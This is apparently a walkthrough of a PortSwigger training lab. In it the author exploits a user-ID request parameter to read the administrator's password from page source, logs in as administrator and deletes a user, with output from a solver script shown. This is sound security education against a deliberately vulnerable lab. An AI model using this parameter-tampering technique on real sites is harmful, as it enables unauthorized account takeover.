# Lab: User ID controlled by request parameter with password disclosure

### Instructions

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

### Solution

Logging into the site with the provided credentials we find a form to update our password.

If we refresh the My Account page and capture this in Burp, the response actually contains the cleartext password:

```html
<input required type="hidden" name="csrf" value="V1z9m0jK7bAjXGrI18PJFYczPBnqPESe">
<input required type=password name=password value='peter'/>
<button class='button' type='submit'> 
```
Although the browser masks the value of an `<input type="password">`, the password is still embedded in the HTML response. The `type="password"` attribute only affects how the field is displayed, but it does not encrypt, hash, or otherwise protect the value in the page source.

We can achieve the same for the administrator by simply navigating to: `https://0add00f30449725a8170527d00fb005d.web-security-academy.net/my-account?id=administrator`

And in the page source we can find the plaintext password for the administrator in the update password form:

```html
<label>Password</label>
<input required type="hidden" name="csrf" value="V1z9m0jK7bAjXGrI18PJFYczPBnqPESe">
<input required type=password name=password value='8tgp5cyfdto83m8dczmy'/>
<button class='button' type='submit'> Update password </button>
```

We can use this password to login as the administrator and delete the user carlos in `/admin`:

```
Users
wiener - Delete
carlos - Delete
```

This marks the lab as solved.

### Python Solution

See `access_control_08.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_08_user_id_controlled_by_request_parameter_with_password_disclosure]
└─$ python access_control_08.py https://0a9100af0343146b81f262a500bb00ec.web-security-academy.net/
[*] Retrieving administrator password...
[+] The administrator password is: i65pi3fn5x098uz5ef0x
[+] Logged in as administrator
[*] Deleting carlos...
[+] Carlos deleted - Lab solved
```
